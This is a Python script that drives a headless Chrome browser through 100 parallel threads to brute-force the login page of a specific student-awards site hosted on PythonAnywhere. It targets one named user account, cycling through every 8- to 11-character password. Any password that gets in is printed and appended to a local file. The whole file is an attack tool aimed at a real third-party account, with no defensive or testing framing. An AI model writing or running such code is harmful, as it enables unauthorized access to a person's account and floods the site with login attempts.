from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import itertools
import string
import time

def normal(username, password):
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_driver = webdriver.Chrome(options=chrome_options)
    chrome_driver.execute_script("window.open('');")
    chrome_driver.switch_to.window(chrome_driver.window_handles[-1])
    chrome_driver.get(
        "https://ssidollars.pythonanywhere.com/accounts/login/?next=/awards/student/560/spend/"
    )
    username_field = chrome_driver.find_element(By.ID, "id_username")
    password_field = chrome_driver.find_element(By.ID, "id_password")
    username_field.send_keys(username)
    password_field.send_keys(password)
    password_field.send_keys(Keys.RETURN)
    time.sleep(5)
    if "Your username and password didn't match." not in chrome_driver.page_source:
        print(f"username: {username}, password: {password}")
        with open("magic.txt", "a") as file:
            file.write(f"\nuser:{username},pass:{password}\n")
        chrome_driver.close()
    else:
        print("fail")
        chrome_driver.close()

    chrome_driver.quit()

characters = string.ascii_letters + string.digits + string.punctuation

min_length = 8
max_length = 11

executor = ThreadPoolExecutor(max_workers=100)

for length in range(min_length, max_length + 1):
    for combination in itertools.product(characters, repeat=length):
        password = "".join(combination)
        executor.submit(normal, "peterkoo81", password)

executor.shutdown(wait=True)
